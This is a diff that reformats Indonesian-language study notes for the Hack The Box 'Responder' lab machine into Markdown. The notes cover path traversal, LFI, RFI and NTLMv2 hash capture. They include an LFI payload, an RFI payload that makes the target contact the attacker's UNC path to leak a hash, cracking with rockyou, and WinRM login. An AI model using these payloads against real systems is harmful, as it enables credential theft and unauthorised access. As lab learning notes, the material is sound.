@@ -1,20 +1,19 @@
-```
-=== HTB Starting Point - Responder ===
-[09 Mei 2026]
+# HTB Starting Point - Responder
+*09 Mei 2026*
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 KONSEP UTAMA
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Target   : Windows machine (Apache + PHP + WinRM)
-Alur     : Recon → LFI → RFI → Tangkap Hash → Crack → Login → Flag
+
+## KONSEP UTAMA
+
+- **Target**: Windows machine (Apache + PHP + WinRM)
+- **Alur**: Recon → LFI → RFI → Tangkap Hash → Crack → Login → Flag
 Pelajaran: Path Traversal, LFI, RFI, NTLM Hash Capture, Password Cracking
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 VIRTUAL HOST & /etc/hosts
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Masalah  : Domain seperti unika.htb tidak bisa di-resolve browser
+
+## VIRTUAL HOST & /etc/hosts
+
+- **Masalah**: Domain seperti unika.htb tidak bisa di-resolve browser
            karena bukan domain publik — hanya ada di jaringan HTB
-Solusi   : Daftarkan manual di /etc/hosts agar OS tau IP-nya
+- **Solusi**: Daftarkan manual di /etc/hosts agar OS tau IP-nya
 
 Tambah entry baru:
   echo "10.129.26.105  unika.htb" | sudo tee -a /etc/hosts
@@ -26,52 +25,39 @@ Ganti IP lama (kalau IP target berubah):
   sudo sed -i '/unika.htb/d' /etc/hosts
   echo "10.129.X.X  unika.htb" | sudo tee -a /etc/hosts
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 TEKNIK & VULNERABILITY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Path Traversal
-  → Teknik memakai ../ untuk keluar dari direktori yang seharusnya
-  → Setiap ../ = naik satu folder ke atas
-  → Kalau sudah di root, tambahan ../ diabaikan sistem
-  → Trik aman: pakai banyak ../ sekaligus (misal 8x) biar pasti nyampe root
 
-LFI (Local File Inclusion)
-  → Vulnerability: parameter bisa dipakai load file LOKAL di server target
-  → Tekniknya: Path Traversal via parameter URL
-  → Perspektif: "lokal" = dari sisi SERVER TARGET, bukan laptop kita
-  → Contoh eksploitasi:
+## TEKNIK & VULNERABILITY
+
+Path Traversal- Teknik memakai ../ untuk keluar dari direktori yang seharusnya- Setiap ../ = naik satu folder ke atas- Kalau sudah di root, tambahan ../ diabaikan sistem- Trik aman: pakai banyak ../ sekaligus (misal 8x) biar pasti nyampe root
+
+LFI (Local File Inclusion)- Vulnerability: parameter bisa dipakai load file LOKAL di server target- Tekniknya: Path Traversal via parameter URL- Perspektif: "lokal" = dari sisi SERVER TARGET, bukan laptop kita- Contoh eksploitasi:
     page=../../../../../../windows/system32/drivers/etc/hosts
 
-RFI (Remote File Inclusion)
-  → Vulnerability: parameter bisa dipakai load file dari server LUAR (kita)
-  → Perspektif: server target "pergi ambil file" ke mesin kita
-  → Di mesin Responder: LFI adalah pintu masuknya, RFI senjata utamanya
-  → Contoh eksploitasi:
+RFI (Remote File Inclusion)- Vulnerability: parameter bisa dipakai load file dari server LUAR (kita)- Perspektif: server target "pergi ambil file" ke mesin kita- Di mesin Responder: LFI adalah pintu masuknya, RFI senjata utamanya- Contoh eksploitasi:
     page=//10.10.14.180/somefile
 
 Perbedaan LFI vs RFI:
-  LFI = server ambil file dari lemari dia sendiri
-  RFI = server ambil file dari rumah kita (attacker)
+- **LFI**: server ambil file dari lemari dia sendiri
+- **RFI**: server ambil file dari rumah kita (attacker)
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 NTLM & HASH
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-NTLM     : New Technology LAN Manager
+
+## NTLM & HASH
+
+- **NTLM**: New Technology LAN Manager
            Protokol autentikasi milik Microsoft
            Password di-hash dulu, hash itulah yang dikirim saat autentikasi
            Tidak bisa di-decode balik — harus di-crack
 
-NTLMv2   : Versi lebih baru dan aman dari NTLM
+- **NTLMv2**: Versi lebih baru dan aman dari NTLM
            Yang tertangkap Responder = NTLMv2 hash
 
 Cara Windows kirim hash:
   Setiap kali Windows coba akses network share,
-  dia otomatis kirim NTLMv2 hash sebagai autentikasi
-  → Inilah yang kita manfaatkan!
+  dia otomatis kirim NTLMv2 hash sebagai autentikasi- Inilah yang kita manfaatkan!
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 TOOLS & SWITCH
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+## TOOLS & SWITCH
+
 [ NMAP ]
   nmap -sV -sC -p- --min-rate 5000 <IP>
   -sV          : deteksi versi service
@@ -106,9 +92,9 @@ Cara Windows kirim hash:
   -p           : password
   Fungsi: remote shell ke Windows via protokol WinRM (port 5985)
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 DOMAIN KNOWLEDGE WINDOWS
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+## DOMAIN KNOWLEDGE WINDOWS
+
 Path penting yang wajib hapal di Windows:
   C:\Windows\System32\drivers\etc\hosts  → DNS lokal
   C:\Windows\System32\config\SAM         → database password
@@ -122,31 +108,30 @@ Port penting Windows:
   5985 → WinRM (HTTP)
   5986 → WinRM (HTTPS)
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 POWERSHELL CHEATSHEET
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-dir              = ls (list isi folder)
+
+## POWERSHELL CHEATSHEET
+
+- **dir**: ls (list isi folder)
 cd <folder>      = pindah folder
 Set-Location     = cd (versi panjang)
 Get-Location     = pwd (cek posisi sekarang)
 cat <file>       = baca isi file
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 ROCKYOU.TXT
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-Apa itu  : Wordlist legendaris berisi 14 juta password
-Asal     : Bocor dari breach RockYou tahun 2009
-Lokasi   : /usr/share/wordlists/rockyou.txt
-Extract  : sudo gunzip /usr/share/wordlists/rockyou.txt.gz
 
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📌 ISTILAH PENTING
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-tun0         = interface VPN HTB di Kali
-UNC Path     = format path jaringan Windows: //IP/folder
-WinRM        = Windows Remote Management, protokol remote akses Windows
-Hash Crack   = tebak password dari hashnya pakai wordlist (bukan decode!)
-LLMNR        = Link-Local Multicast Name Resolution, protokol yang dieksploitasi Responder
-SMB          = Server Message Block, protokol file sharing Windows
-Virtual Host = domain yang hanya ada di jaringan lokal/private
-```
+## ROCKYOU.TXT
+
+- **Apa itu**: Wordlist legendaris berisi 14 juta password
+- **Asal**: Bocor dari breach RockYou tahun 2009
+- **Lokasi**: /usr/share/wordlists/rockyou.txt
+- **Extract**: sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+
+## ISTILAH PENTING
+
+- **tun0**: interface VPN HTB di Kali
+- **UNC Path**: format path jaringan Windows: //IP/folder
+- **WinRM**: Windows Remote Management, protokol remote akses Windows
+- **Hash Crack**: tebak password dari hashnya pakai wordlist (bukan decode!)
+- **LLMNR**: Link-Local Multicast Name Resolution, protokol yang dieksploitasi Responder
+- **SMB**: Server Message Block, protokol file sharing Windows
+- **Virtual Host**: domain yang hanya ada di jaringan lokal/private
